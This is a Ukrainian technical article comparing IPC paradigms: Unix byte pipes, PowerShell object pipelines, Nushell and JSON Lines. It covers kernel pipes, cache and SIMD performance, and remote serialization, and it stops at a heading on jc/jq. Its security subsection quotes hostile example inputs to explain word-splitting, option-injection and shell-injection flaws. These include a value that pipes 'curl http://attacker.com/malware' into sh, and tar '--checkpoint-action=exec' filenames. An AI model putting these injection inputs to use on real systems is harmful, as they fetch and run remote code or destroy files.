# ⚖️ Парадигми міжпроцесної взаємодії: потік байтів Unix, об'єкти PowerShell та структурований JSON

Міжпроцесна взаємодія (IPC) та композиція утиліт командного рядка визначають те, як операційна система масштабує складність програмного забезпечення. Замість монолітних програм, що намагаються реалізувати всі можливі функції, системна інженерія будує ланцюги з невеликих, спеціалізованих інструментів. Проте фундаментальним інженерним питанням є **формат контракту**, через який ці компоненти обмінюються станом.

В історії комп'ютерних систем сформувалися п'ять головних парадигм передачі даних між процесами:

1. **Неструктурований байтовий потік (Raw Byte Stream) Unix:** Програми взаємодіють через нетипізовані послідовності байтів (`char*`), де межі записів і полів позначаються конвенційними роздільниками (`\n`, `\0`, `\t`, `:`).
2. **Об'єктний конвеєр (Object Pipeline) PowerShell:** Програми передають живі посилання на керовані об'єкти віртуальної машини .NET CLR (`PSObject`), зберігаючи строгі типи даних, ієрархічні властивості та методи.
3. **Монолітний простір об'єктів (Single Address Space) Lisp-машин та Smalltalk:** Програми виконуються в єдиному адресному просторі (образ пам'яті), де конвеєр є прямим обміном повідомленнями між екземплярами класів без процесних бар'єрів і без серіалізації.
4. **Типізовані потокові таблиці Nushell:** Сучасна модель без важкого збирача сміття, де конвеєр передає типізовані структури даних мови Rust з фіксованою схемою, поєднуючи продуктивність скомпільованого коду зі структурованістю полів.
5. **Структурований текстовий потік (JSON Lines / ndjson):** Гібридна модель, де кожен рядок являє собою валідний серіалізований документ JSON, поєднуючи універсальність потоку Unix з машинною структурою об'єктів.

## Архітектура та внутрішні механізми передачі даних

Поведінка кожної парадигми та її інженерні компроміси випливають із того, як саме дані проходять крізь структури ядра операційної системи або адресний простір середовища виконання.

```
1. Байтовий потік Unix (ядро Linux):
+----------------+   sys_write()    +--------------------+   sys_read()    +----------------+
|  Процес A      | ───────────────> | pipe_buffer (64KB) | ──────────────> |  Процес B      |
|  (User Space)  |   (копіювання)   | (Сторінки ядра)    |   (копіювання)  |  (User Space)  |
+----------------+                  +--------------------+                 +----------------+

2. Об'єктний конвеєр PowerShell (керована купа .NET CLR):
+-------------------------------------------------------------------------------------------+
| Єдиний процес pwsh (CLR Managed Heap)                                                     |
| +------------------+     посилання на об'єкт (IntPtr)     +-----------------------------+ |
| | Get-Process      | ───────────────────────────────────> | Where-Object                | |
| | (ProcessRecord)  |      PSObject (TypeHandle + Fields)  | (ProcessRecord)             | |
| +------------------+                                      +-----------------------------+ |
+-------------------------------------------------------------------------------------------+

3. Структурований JSON Lines (гібридний потік через IPC):
+----------------+   "{\"pid\":101}\n"   +--------------------+   JSON parser   +-----------+
|  cli --json    | ────────────────────> | pipe_buffer (64KB) | ──────────────> |    jq     |
|  (Серіалізація)|                       | (Кільце сторінок)  |                 | (AST/Map) |
+----------------+                       +--------------------+                 +-----------+
```

### 1. Байтовий конвеєр Unix у ядрі Linux

У класичній архітектурі Unix канал IPC створюється системним викликом `pipe()` або `pipe2()`. Ядро виділяє структуру `struct pipe_inode_info`, яка містить кільцевий масив сторінкових буферів `struct pipe_buffer`.

- **Розмір буфера:** У сучасному Linux розмір буфера каналу за замовчуванням становить 16 сторінок пам'яті (64 КБ для архітектури x86-64). Розмір можна змінити через виклик `fcntl(fd, F_SETPIPE_SZ, size)`.
- **Синхронізація та backpressure:** Коли процес-генератор викликає `write()`, байти копіюються з буфера простору користувача у сторінки пам'яті ядра. Якщо буфер заповнюється, ядро переводить процес-генератор у стан сну (`TASK_INTERRUPTIBLE`), додаючи його до черги очікування `wait_queue_head_t`. Як тільки процес-отримувач зчитує байти викликом `read()`, писар автоматично пробуджується планувальником ядра.
- **Обробка розриву каналу:** Якщо процес-читач закриває свій дескриптор, будь-яка подальша спроба запису генерує асинхронний сигнал `SIGPIPE` та повертає помилку `EPIPE`. Це дозволяє утилітам на зразок `head -n 10` миттєво зупиняти тривалі генератори виводу (наприклад, `yes` або нескінченний `find`) без витоку ресурсів процесора.
- **Оптимізація Zero-Copy:** За допомогою системного виклику `splice()` дані можуть переміщуватися між дескриптором файлу, каналом та мережевим сокетом шляхом простого перепризначення вказівників на фізичні сторінки пам'яті (`struct page*`) у ядрі без жодного копіювання байтів у простір користувача.
- **Споживання оперативної пам'яті:** Пам'ять становить строго `O(1)` відносно загального обсягу потоку. Конвеєр здатен передати терабайтний масив даних через фіксований буфер розміром 64 КБ.

### 2. Об'єктний конвеєр PowerShell та рантайм .NET CLR

PowerShell відмовився від передачі сирого тексту між процесами. За замовчуванням усі стандартні командлети виконуються в межах **єдиного процесу** середовища виконання .NET (наприклад, `pwsh.exe` або `powershell.exe`).

- **Життєвий цикл конвеєра:** Кожен командлет реалізує три базові методи інтерфейсу: `BeginProcessing()` (ініціалізація стану), `ProcessRecord()` (обробка окремого об'єкта, що надійшов із конвеєра) та `EndProcessing()` (фіналізація та вивантаження залишків). Дані передаються між командлетами об'єкт за об'єктом у міру їх появи, забезпечуючи об'єктну потоковість.
- **Анатомія `PSObject`:** Кожен екземпляр у конвеєрі огортається структурою `System.Management.Automation.PSObject`. Вона містить:
  1. Посилання на оригінальний об'єкт .NET (наприклад, `System.Diagnostics.Process`).
  2. Колекцію адаптованих властивостей (`PSAdaptedProperty`) для доступу до публічних полів та властивостей класу.
  3. Колекцію синтетичних нотаток (`PSNoteProperty`) та динамічних методів (`ScriptMethod`), які розробник може додавати до об'єкта під час виконання.
- **Накладні витрати пам'яті та тиск на GC:** Створення об'єкта в керованій купі .NET супроводжується накладними витратами: службовий заголовок об'єкта (`Object Header`, 8 байтів на 64-бітній платформі), вказівник на таблицю методів (`MethodTable*`, 8 байтів) та внутрішні словники метаданих властивостей. Обробка потоку зі 100 000 записів створює мільйони дрібних алокацій у нульовому поколінні збирача сміття (GC Generation 0), спричиняючи часті цикли збирання сміття та кеш-промахи CPU.
- **Проблема міжпроцесного та міжмережевого бар'єра:** Коли конвеєр PowerShell перетинає межі процесу (наприклад, через фонові задачі `Start-Job` чи віддалене адміністрування через WinRM/SSH), об'єкт більше не може передаватися як пряме посилання на пам'ять. Рушій виконує серіалізацію в ієрархічний XML-формат (CLIXML) або JSON. Отриманий на іншому боці об'єкт стає «знекровленим» (deserialized object з типом `Deserialized.System.Diagnostics.Process`): він містить статичний зліпок полів на момент зняття, але втрачає всі живі методи (наприклад, виклик `$proc.Kill()` на десеріалізованому об'єкті призведе до помилки).

### 3. Монолітний простір об'єктів: Lisp-машини та Smalltalk-80

Історичним попередником об'єктних конвеєрів були системи з єдиним адресним простором (Single Address Space Operating Systems), такі як Symbolics Genera (Lisp Machine Lisp) та Xerox Alto (Smalltalk-80).

- **Відсутність концепції файлового дескриптора для IPC:** В операційній системі не існувало поділу на «ядро» та «ізольовані процеси простору користувача». Усі системні утиліти, редактори, компілятори та мережеві драйвери жили як екземпляри класів усередині постійно збереженого на диску образу пам'яті (Memory Image).
- **Композиція як виклик методів:** Конвеєр будувався як пряма композиція функцій вищого порядку (`map`, `filter`, `reduce` у Lisp або `select:`, `collect:`, `inject:into:` у Smalltalk).
- **Плюси та фатальні недоліки:** Модель забезпечувала абсолютну типобезпеку та нульові витрати на серіалізацію, проте повна відсутність апаратної ізоляції пам'яті (MMU page protection між завданнями) означала, що помилка у вказівнику або витік пам'яті в одній функції руйнувала весь образ операційної системи.

### 4. Типізовані таблиці Nushell

Оболонка Nushell (написана на Rust) запропонувала архітектуру, що поєднує структурну типізацію з відсутністю віртуальної машини та збирача сміття.

- **Внутрішній тип `Value`:** Усі дані всередині конвеєра представлені системним переліком `enum Value`, який містить як скалярні типи (`Int`, `Float`, `String`, `Bool`, `Date`, `Filesize`, `Duration`), так і складні колекції (`Record`, `List`, `Table`, `Binary`, `Range`).
- **Конвеєризація потоків `PipelineData`:** Конвеєр оперує абстракцією `PipelineData`, яка має три стани:
  1. `Value` — одиничний типізований об'єкт.
  2. `ListStream` — лінивий потоковий ітератор типізованих рядків (таблиця генерується поелементно без завантаження всього набору в RAM).
  3. `ByteStream` — сирий байтовий потік, що активується автоматично при виклику зовнішніх бінарних утиліт C/Rust/Go.
- **Пам'ять та швидкість:** Оскільки Nushell скомпільована в нативний машинний код і керує пам'яттю за семантикою володіння Rust (RAII), вона не має пауз на збирання сміття (GC stalls) і забезпечує швидкість виконання, наближену до класичних утиліт C.

### 1. Типізація, семантика та безпека: розділювальні атаки, ін'єкції опцій та Shell Injection

Головний архітектурний компроміс сирого текстового потоку Unix полягає у **семантичній деградації даних**. Коли програма формує вивід, вона виконує операцію форматування (наприклад, `printf("%lu %f %s", size, load, time)`), перетворюючи двійкові числа процесора на послідовність символів ASCII або UTF-8. Наступна утиліта в конвеєрі мусить виконати зворотний синтаксичний аналіз цього тексту:

```
[Число 104857600 (uint64)] ──(printf)──> "100M" ──(regex/sscanf)──> [Число 104857600]
```

Цей подвійний перерахунок створює низку критичних інженерних вразливостей та точок відмови:

#### Розщеплення слів (Word Splitting) та розділювальні атаки

У командних оболонках POSIX змінна внутрішнього роздільника полів `IFS` (Internal Field Separator) за замовчуванням містить пробіл, знак табуляції та символ нового рядка (` <space><tab>\n`). Коли неструктурований вивід утиліти передається в цикл або підставляється як аргумент команди через механізм Command Substitution:

```bash
# ВРАЗЛИВИЙ КОД: розщеплення слів через неконтрольований IFS
for file in $(find /var/log -type f); do
    rm "$file"
done
```

Якщо ім'я файлу на диску містить пробіли (наприклад, `/var/log/audit report 2026.log`), оболонка розщеплює єдиний рядок на три незалежні аргументи: `/var/log/audit`, `report` та `2026.log`. Скрипт намагається видалити неіснуючі або помилкові файли.

Ще небезпечнішою є **колізія роздільників (Delimiter Collision)**. У файлових системах POSIX (ext4, XFS, Btrfs) будь-який байт від `0x01` до `0xFF` (включно з пробілами, табуляціями, двокрапками та символами нового рядка `\n`) є абсолютно валідним символом у назві файлу чи каталогу. Єдиними забороненими байтами є нульовий байт `0x00` (`NUL`) та слеш `/` як роздільник шляху. 

Коли утиліти на зразок `ls`, `ps`, `netstat` чи `df` використовують пробіл або двокрапку як роздільник полів запису, входження роздільника у тіло самих даних (наприклад, ім'я процесу `worker: pool 1` або ім'я користувача з пробілом) незворотно ламає синтаксичний аналіз утилітами `awk`, `cut` та `sed`.

#### Ін'єкція параметрів командного рядка (Option / Flag Injection)

Коли текстовий потік передається як список аргументів для іншої бінарної утиліти, виникає атака підміни прапорців. Системні бібліотеки C (`getopt()`, `getopt_long()`) парсять аргументи з масиву `argv[]` зліва направо, інтерпретуючи будь-який рядок із початковим дефісом `-` як ключ конфігурації.

Якщо у каталозі створено файл із назвою `-rf` або `--checkpoint-action=exec=sh`:

```bash
# Катастрофічна вразливість: ін'єкція опцій утиліти rm
rm *
# Розгортається оболонкою у виклик: rm file1.txt file2.txt -rf file3.txt
# Утиліта rm сприймає ім'я файлу '-rf' як прапорці рекурсивного примусового видалення!
```

В утиліті `tar` файл з ім'ям `--checkpoint=1` та `--checkpoint-action=exec=sh shell.sh` при розгортанні маски `tar cf archive.tar *` призводить до **виконання довільного коду** від імені поточного користувача.

Єдиним захисним паліативом у світі Unix є використання спеціального роздільника кінця опцій `--` (Double Dash), який наказує функції `getopt()` припинити парсинг прапорців та інтерпретувати всі наступні елементи як позиційні аргументи:

```bash
# Безпечний виклик утиліти з роздільником опцій
rm -f -- "$file"
```

На противагу цьому, в об'єктному конвеєрі PowerShell ім'я файлу передається як екземпляр `System.IO.FileInfo`. Властивість `FullName` інкапсульована всередині об'єкта. Командлет `Remove-Item` зв'язує вхідний об'єкт із строго типізованим параметром `-LiteralPath` або передає його безпосередньо у Win32 API `DeleteFileW()` / системний виклик `unlink()`. Лексичний аналізатор прапорців узагалі не бере участі в обробці значення, що гарантує 100% захист від ін'єкцій прапорців за самою конструкцією середовища.

#### Shell Injection через динамічну конкатенацію рядків

При композиції текстових команд інженери часто вдаються до інтерполяції рядків у скриптах або викликів системних оболонок з високорівневих мов програмування (`os.system()` у Python, `exec()` у Node.js, `eval` у Bash):

```bash
# Вразливість командної ін'єкції
user_input="file.txt; curl http://attacker.com/malware | sh"
eval "process_log $user_input"
```

Оскільки текстовий інтерфейс Unix не розрізняє **код керування** та **дані**, метасимволи оболонки (`;`, `&`, `|`, `` ` ``, `$()`, `>`, `<`, `\n`) перехоплюють потік виконання інтерпретатора.

В об'єктних конвеєрах (PowerShell, Nushell) та типізованих RPC-інтерфейсах (gRPC) передача даних реалізована через внутрішні бінарні структури пам'яті чи типізовані абстрактні синтаксичні дерева (AST). Дані ніколи не проходять повторний лексичний аналіз командним інтерпретатором, що повністю усуває клас уразливостей Shell Injection.

#### Угода про NUL-байт (`\0`) та її інженерні межі

Для подолання проблеми роздільників у стандарті POSIX було прийнято угоду про використання нульового байта `0x00` (`\0`) як роздільника записів. Оскільки нульовий байт позначає кінець рядка в мові C (`null-terminated string`), він є єдиним символом, який фізично не може бути присутнім у жодному імені файлу чи шляху в операційній системі Linux.

Утиліти GNU Coreutils та POSIX підтримують потокову роботу через нульовий байт:

```bash
# Надійний конвеєр обробки файлів з довільними назвами
find /var/log -type f -name "*.log" -print0 | xargs -0 -I {} rm -f -- "{}"
```

- **Прапорці:** `find -print0`, `xargs -0`, `grep -z`, `sort -z`, `read -d ''`.
- **Чому це не універсальне рішення:** Нульовий байт захищає виключно передачу списків імен файлів. Він не вирішує проблему складних багатоколонкових записів (наприклад, полів журналу `timestamp`, `pid`, `message`), не запобігає семантичному спотворенню числових даних і вимагає постійної явної підтримки прапорців кожною окремою утилітою в ланцюгу конвеєра.

### 2. Апаратна локальність, поведінка кешу CPU (L1/L2), SIMD-векторизація та енергетичний бюджет

Продуктивність міжпроцесного конвеєра на рівні заліза визначається тим, як структури даних взаємодіють із підсистемою пам'яті сучасного суперскалярного процесора (кеш-лінії, апаратні префетчери, векторні регістри SIMD та контролери DRAM).

```
1. Сирий байтовий потік (Неперервний буфер у L1/L2):
Кеш-лінія CPU (64 байти): [ 'u' | 's' | 'e' | 'r' | ' ' | '1' | '0' | '2' | '4' | ... | '\n' ]
Утилізація кешу: 100% (усі 64 байти завантаженої лінії містять корисні дані потоку)
Апаратний стрим-префетчер: Визначає лінійний страйд +1 та наперед підтягує сторінки в L1.

2. Об'єктний граф PowerShell у керованій купі (.NET CLR):
Кеш-лінія CPU (64 байти): [ MethodTable* | Object Header | IntPtr -> PSAdaptedProp | ... сміття ]
Утилізація кешу: 12.5% (із 64 байтів корисний лише 8-байтний покажчик, решта — кеш-промах)
Покажчиковий слалом: Процесор блокує конвеєр (Pipeline Stall) на 50–200 тактів при кожному переході.
```

#### Кеш-лінії CPU та апаратний префетчер

Розмір кеш-лінії сучасних мікропроцесорів x86-64 (Intel Core, AMD Zen) та ARM64 (Apple Silicon, Neoverse) становить **64 байти**. 

- **Лінійний доступ у текстовому конвеєрі Unix:** Сирий потік читається великими порціями (4 КБ – 64 КБ) у послідовний буфер пам'яті. Доступ до байтів відбувається строго послідовно зі страйдом 1 (stride = 1). Апаратний блок попереднього завантаження ядра процесора (L2 Stream / Spatial Prefetcher) миттєво розпізнає лінійний паттерн і автоматично підтягує наступні кеш-лінії з оперативної пам'яті в кеш L2 та L1 до того, як інструкція звернеться до них. Промахи кешу (L1/L2 Cache Misses) практично прямують до нуля, а утилізація пропускної здатності шини пам'яті досягає теоретичного максимуму (100% завантажених байтів є корисними даними).
- **Покажчиковий слалом (Pointer Chasing) в об'єктному графі:** Керована купа .NET CLR або JVM фрагментована. Щоб звернутися до властивості процесу (наприклад, `$process.WorkingSet64`), процесор змушений виконати ланцюжок непрямих розіменувань:
  1. Завантажити адресу об'єкта `PSObject` (кеш-промах, очікування 50–150 тактів CPU).
  2. Завантажити адресу внутрішнього об'єкта `System.Diagnostics.Process` через заголовок (другий кеш-промах).
  3. Прочитати вказівник на таблицю типів `MethodTable*` та словник властивостей `PSAdaptedProperty` (третій кеш-промах).
  У результаті з кожної завантаженої з пам'яті 64-байтної кеш-лінії реально використовується лише одне 8-байтне значення покажчика (утилізація кеш-лінії становить лише 12.5%). Решта 87.5% пропускної здатності шини пам'яті витрачається марно, а суперскалярний конвеєр процесора простоює (stall), очікуючи даних з повільної оперативної пам'яті DRAM.

#### SIMD-векторизація пошуку роздільників (AVX2 / AVX-512 / NEON)

Утиліти обробки байтових потоків (наприклад, сучасні версії `grep`, `ripgrep`, `awk`, `sed`) використовують векторні розширення процесора для паралельного пошуку роздільників `\n` або `\0`.

:::tabs
```c
// Сканування 32 байтів на наявність роздільника '\n' за 1 такт CPU (AVX2)
#include <immintrin.h>
#include <stdint.h>
#include <stddef.h>

void scan_newlines_c(const char* buffer, size_t len) {
    for (size_t i = 0; i < len; i += 32) {
        __m256i chunk = _mm256_loadu_si256((const __m256i*)(buffer + i));
        __m256i match = _mm256_cmpeq_epi8(chunk, _mm256_set1_epi8('\n'));
        uint32_t mask = (uint32_t)_mm256_movemask_epi8(match);

        while (mask != 0) {
            int pos = __builtin_ctz(mask); // Апаратний підрахунок нулів (1 такт)
            process_record(buffer + i + pos);
            mask &= mask - 1; // Очищення молодшого біта
        }
    }
}
```
```cpp
// C++20: Сканування блоку пам'яті через std::span, <bit> та AVX2-інтринсики
#include <immintrin.h>
#include <bit>
#include <span>
#include <cstdint>

void scan_newlines_cpp(std::span<const char> buffer) noexcept {
    const size_t len = buffer.size() - (buffer.size() % 32);
    for (size_t i = 0; i < len; i += 32) {
        const auto* ptr = reinterpret_cast<const __m256i*>(buffer.data() + i);
        __m256i chunk = _mm256_loadu_si256(ptr);
        __m256i match = _mm256_cmpeq_epi8(chunk, _mm256_set1_epi8('\n'));
        auto mask = static_cast<uint32_t>(_mm256_movemask_epi8(match));

        while (mask != 0) {
            int pos = std::countr_zero(mask); // C++20 <bit>: апаратний ctz без розгалужень
            process_record(buffer.subspan(i + pos));
            mask &= mask - 1; // Очищення обробленого біта
        }
    }
}
```
:::

- **Обробка 32 або 64 байтів за 1 такт:** Векторна інструкція `_mm256_cmpeq_epi8` (AVX2) або `_mm512_cmpeq_epi8_mask` (AVX-512) порівнює 32 чи 64 байти одночасно за один машинний цикл.
- **Повна відсутність розгалужень (Zero Branch Mispredictions):** Позиція знайденого символа обчислюється апаратною інструкцією підрахунку кількості нулів у бітовій масці (`tzcnt` або `ctz`). У внутрішньому циклі сканування взагалі немає умовних переходів `cmp`/`je`, що запобігає штрафам за хибне передбачення розгалужень (Branch Misprediction Penalty), які скидають до 15–20 стадій конвеєра CPU.

#### Двоетапний SIMD-розбір структурованого тексту (`simdjson`)

Сучасні високопродуктивні парсери структурованого тексту (зокрема бібліотека `simdjson`) довели, що навіть складний синтаксис JSON можна обробляти з пропускною здатністю 3–4 ГБ/с на одне ядро процесора за допомогою двоетапного векторного конвеєра:

1. **Етап 1 (Stage 1 — Векторна індексація):** Процесор сканує вхідний потік байтів 64-байтними блоками через AVX-512 або AVX2. За допомогою паралельних векторних інструкцій безпереносного множення (Carry-Less Multiplication, `clmul`) та табличних перестановок `pshufb` будується бітова маска всіх рядкових літералів, екранованих символів (зворотних слешів `\\`) та структурних роздільників (`{`, `}`, `[`, `]`, `:`, `,`).
2. **Етап 2 (Stage 2 — Побудова лінійного індексу Tape):** На основі бітової маски парсер записує лінійний масив структурних токенів (Tape) у компактний неперервний буфер без рекурсивних викликів функцій та без виділення дрібних об'єктів у купі (`malloc`/`new`).

#### Енергоефективність (Joules per Record / Energy Budget)

Фізика споживання енергії на сучасних напівпровідникових кристалах визначається не стільки обчисленнями в арифметико-логічному пристрої (ALU), скільки переміщенням електричних зарядів по шинах пам'яті:

- Виконання 64-бітної арифметичної операції в регістрах споживає близько **1–5 пДж** (пікоджоулів).
- Зчитування 64 байтів з кешу L1 коштує близько **10–20 пДж**.
- Зчитування з кешу L2/L3 коштує близько **50–200 пДж**.
- Звернення до контролера оперативної пам'яті DRAM та заряджання довгих ємнісних ліній пам'яті через кеш-промах споживає **1000–2500 пДж** (у 100–250 разів дорожче за звернення до L1).

Текстовий конвеєр Unix утримує оброблюваний потік у гарячому кеші L1/L2 ядра, мінімізуючи транзакції по зовнішній системній шині. Об'єктний конвеєр через значний розмах алокацій та постійне переміщення об'єктів збирачем сміття (GC thread mark-and-sweep, переміщення об'єктів між поколіннями Gen 0 -> Gen 1 -> Gen 2) безперервно навантажує підсистему пам'яті DRAM. Як наслідок, сумарна витрата енергії (джоулі на 1 мільйон відфільтрованих записів) в об'єктному середовищі є на **1–2 порядки вищою**, що має критичне значення для щільних хмарних серверів та автономних вбудованих пристроїв.

### 3. Масштабування в розподілених системах: байтові тунелі, PSRP, JSON over HTTP та gRPC/Protobuf

Коли конвеєр виходить за межі одного ядра чи одного хоста, спосіб представлення даних визначає пропускну здатність мережі, накладні витрати серіалізації та складність узгодження розподілених контрактів.

```
Мережеві конвеєри:
1. Сирий потік Unix (SSH / netcat):
[Host A: tar] ═══════════════ сирий TCP-потік (без схеми) ══════════════> [Host B: tar]

2. PowerShell Remoting (WinRM / PSRP):
[Host A: pwsh] ──(CLIXML DOM)──> [SOAP/HTTP тунель] ──(Hydration)──> [Host B: Deserialized]

3. Розподілений RPC (gRPC / Protobuf):
[Host A: Microservice] ═══ HTTP/2 Multiplex (Binary Varint Frames) ═══> [Host B: Microservice]
```

#### 1. Сирі байтові конвеєри Unix через мережу (`ssh`, `netcat`, `socat`)

Класичний підхід Unix переносить локальний конвеєр у мережу шляхом перенаправлення дескрипторів сокетів:

```bash
# Реплікація файлової системи через мережевий тунель
tar -czf - /var/log | ssh remote-host "tar -xzf - -C /backup"
```

- **Переваги:** Максимальна пропускна здатність на рівні фізичної швидкості мережевої карти (line rate). Системний виклик `splice()` передає дані з каналу ядра безпосередньо в мережевий сокет без копіювання в простір користувача.
- **Обмеження:**
  - **Head-of-Line Blocking та відсутність мультиплексування:** Один TCP-потік обслуговує рівно один конвеєр. Для паралельної передачі десяти потоків потрібно відкривати десять окремих TCP-з'єднань та аутентифікувати окремі SSH-сесії.
  - **Крихкість контролю помилок:** Потік стандартного виводу помилок (`stderr`) або змішується з даними, або передається окремим неструктурованим текстом. Помилка в одному байті або непередбачений обрив з'єднання ламає весь конвеєр без можливості відновлення з точки збою.
  - **Повна відсутність контрактів:** Віддалена сторона мусить припускати версію формату даних без машинної верифікації.

#### 2. Віддалена взаємодія PowerShell (PSRP over WinRM/SSH)

PowerShell розширює об'єктний конвеєр на віддалені вузли за допомогою протоколу PowerShell Remoting Protocol (PSRP).

- **Формат CLIXML:** Оскільки живий вказівник на керовану купу .NET неможливо передати через сокет, рантайм серіалізує об'єктне дерево у багатослівний XML-документ:
  ```xml
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Diagnostics.Process</T>
      <T>System.ComponentModel.Component</T>
    </TN>
    <Props>
      <I32 N="Id">1024</I32>
      <S N="ProcessName">nginx</S>
      <I64 N="WorkingSet64">104857600</I64>
    </Props>
  </Obj>
  ```
- **Ціна серіалізації:** Формат CLIXML роздуває обсяг корисного навантаження на **300–800%** порівняно з сирим текстом. Процесори на обох кінцях витрачають значні ресурси на побудову та розбір DOM-дерева XML.
- **Знекровлення об'єктів (Hydrated State):** Отриманий на стороні клієнта об'єкт є статичним зліпком значень (`Deserialized.System.Diagnostics.Process`). Він більше не має зв'язку з живим ресурсом операційної системи та втрачає методи управління.

#### 3. Структурований текст у хмарі: JSON Lines over HTTP/REST та Kafka

У мікросервісній архітектурі та хмарних платформах (Kubernetes, AWS, OpenSearch) стандартом обміну став потоковий JSON (JSON Lines або події в Apache Kafka).

- **Переваги:** Повна мовна нейтральність, читабельність для інженера, прозорий моніторинг за допомогою `curl` та `jq`.
- **Вузькі місця:** 
  - **Надлишок повторюваних ключів:** У кожному окремому рядку передаються однакові рядкові назви полів (`{"timestamp":..., "host":..., "status":...}`), що створює значний надлишковий мережевий трафік (до 60–80% від загального обсягу).
  - **Витрати на парсинг:** Перетворення рядків UTF-8 у числа та дати навантажує сервери-агрегатори логів, вимагаючи встановлення спеціалізованих SIMD-прискорювачів або переходу на бінарні формати.

#### 4. Бінарні типізовані RPC: gRPC, Protocol Buffers та FlatBuffers

Для високонавантажених розподілених конвеєрів інженерія перейшла до бінарних контрактів із суворою схемою (IDL):

- **Компактне двійкове кодування (Protobuf Wire Format):** Замість текстових назв полів передаються числові теги (Field Tags, 1–2 байти). Числа упаковуються у форматі змінної довжини (Varint та ZigZag), де число `1` займає рівно 1 байт замість 4 чи 8 байтів, а відсутні поля взагалі не займають місця на дроті.
- **Мультиплексування та двонаправлені потоки (HTTP/2 Multiplexing):** Протокол gRPC поверх HTTP/2 дозволяє передавати сотні незалежних конвеєрів через **єдине TCP-з'єднання**. Кожен потік має власний ідентифікатор фрейму (`Stream ID`) та незалежний механізм контролю швидкості передачі (Flow Control через фрейми `WINDOW_UPDATE`).
- **Еволюція схем без порушення сумісності:** Додавання нових полів із новими числовими тегами не ламає старі версії сервісів: невідомі теги просто пропускаються декодером, забезпечуючи плавну міграцію без одночасної зупинки кластера.
- **Zero-Copy десеріалізація (FlatBuffers / Cap'n Proto):** Дані організовані в буфері так, що поля внутрішніх структур вирівняні під вимоги процесора. Отримувач може зчитувати поля безпосередньо з буфера мережевого сокета без жодного етапу розбору чи виділення пам'яті в купі (`O(1)` Deserialization).

| Параметр | Сирий Unix потік (SSH) | PSRP (PowerShell CLIXML) | JSON Lines (ndjson / HTTP) | gRPC / Protocol Buffers | FlatBuffers / Cap'n Proto |
|---|---|---|---|---|---|
| **Розмір на дроті (Wire Size)** | Мінімальний (сирі байти) | Величезний (+300–800%) | Помірний (+50–150% від тексту) | Дуже компактний (-50% від JSON) | Компактний |
| **Витрати CPU на серіалізацію** | Нульові | Екстремальні (XML парсинг) | Середні (парсинг тексту) | Низькі (бінарні бітові зсуви) | Практично нульові (`O(1)`) |
| **Мультиплексування з'єднань** | Відсутнє (1 потік = 1 socket) | Послідовне в сесії | Потребує HTTP/2 | Повне (HTTP/2 streams) | Повне (через RPC транспорт) |
| **Суворість схеми (Schema)** | Немає (сліпий потік) | Неявна (.NET типи) | Опційна (JSON Schema) | Сувора (IDL `.proto`) | Сувора (IDL `.fbs`) |
| **Контроль швидкості (Backpressure)** | На рівні вікна TCP | На рівні буфера сесії | На рівні HTTP фреймів | На рівні окремого gRPC потоку | На рівні окремого потоку |

### 4. Міжмовна сумісність та зв'язність екосистем (Decoupling)

Фундаментальна сила Unix-конвеєра полягає в **абсолютній відв'язаності компонентів** (Loose Coupling).

- **Unix як універсальна шина:** Контрактом взаємодії виступають лише два системні файлові дескриптори: `0` (stdin) та `1` (stdout). Перша програма може бути написана на C, друга — на Python, третя — на Rust, а четверта — на скриптовій мові Bash. Їм не потрібні спільні бібліотеки типів, сумісні версії середовища виконання або скомпільовані заголовні файли. Будь-який процес, здатний виконати системні виклики `read()` та `write()`, стає повноправним вузлом конвеєра.
- **Ізоляція PowerShell:** Об'єктний конвеєр PowerShell працює виключно всередині середовища виконання .NET. Якщо в конвеєр викликається скомпільована бінарна утиліта (наприклад, `git.exe` або `ffmpeg.exe`), PowerShell змушений скидати об'єктний режим і перетворювати вивід цієї утиліти на звичайний масив рядків (`string[]`). Для повернення у світ об'єктів інженер змушений вручну писати регулярні вирази або синтаксичні конвертери.

```powershell
# Вимушена деградація до тексту при виклику нативних бінарних утиліт
$gitStatus = git status --porcelain
# $gitStatus стає звичайним масивом рядків System.String[], втрачаючи переваги об'єктів
```

### 5. Стійкість до змін (Schema Evolution) та крихкість скриптів

Позиційний синтаксичний аналіз тексту є головною причиною крихкості скриптів системного адміністрування (Fragile Scripting).

Розглянемо класичний приклад з утилітою `df`:

```bash
# Типовий крихкий скрипт Unix: очікує, що 4-й стовпець - це вільне місце
df -h | awk '{print $4}'
```

Цей скрипт ламається у трьох випадках:
1. **Зміна довжини поля:** Якщо назва файлової системи (1-й стовпець) занадто довга, деякі версії утиліти `df` переносять решту стовпців на наступний фізичний рядок, зміщуючи всі номери полів.
2. **Зміна форматування у новій версії:** Додавання розробниками операційної системи нового стовпця (наприклад, прапорця типу монтування) автоматично зсуває індекси утиліти `awk`, і скрипт починає без попередження зчитувати помилкові дані.
3. **Вплив мовної локалі:** Якщо в системі встановлено змінну `LANG=uk_UA.UTF-8` або `de_DE.UTF-8`, назви колонок у заголовку перекладаються іншою мовою, ламаючи фільтри `grep -v "Filesystem"`.

В об'єктних та структурованих моделях доступ здійснюється **за іменем властивості**, а не за її позицією:

```powershell
# PowerShell: імунітет до порядку полів
Get-Volume | Select-Object -Property SizeRemaining

# Nushell: типізований доступ до колонки
ls | where size > 100MiB | select name size

# Структурований JSON з jq: доступ за фіксованим ключем
df --output=source,avail | jc --df | jq '.[].available'
```

Зміна порядку полів, додавання 20 нових атрибутів або зміна мови інтерфейсу операційної системи не мають жодного впливу на роботу цих конвеєрів.

## Сучасний гібридний ландшафт: як екосистеми конвергують

Розуміння меж сирого тексту та важких об'єктних рантаймів призвело до конвергенції системних інструментів у бік **структурованого тексту на базі JSON**.

```
Еволюція конвеєрів:
1970-ті (Unix):       [Програма A] ──(сирі байти ASCII \n)──> [Програма B]
2000-ні (PowerShell): [Командлет A] ──(об'єкти .NET у купі)───> [Командлет B]
2020-ті (Гібрид):     [CLI-утиліта] ──(структурований JSONL)──> [jq / фільтр]
```

### 1. Нативна підтримка `--json` у системних утилітах Linux

Провідні системні інструменти сучасної інфраструктури Linux відмовилися від необхідності текстового парсингу людино-орієнтованого виводу, додавши вбудований машинний прапорець експорту структури:

- `ip -j addr` та `ip -j route` (пакет `iproute2` для мережевої конфігурації).
- `lsblk --json` (дерево блокових пристроїв та дисків).
- `journalctl -o json` (потоковий експорт подій системного журналу `systemd-journald`).
- `docker ps --format '{{json .}}'` та `crictl pods -o json` (контейнерні платформи).
- `kubectl get pods -o json` (оркестрація розподілених кластерів).

### 2. Транслятори `jc` та екосистема обробників `jq`

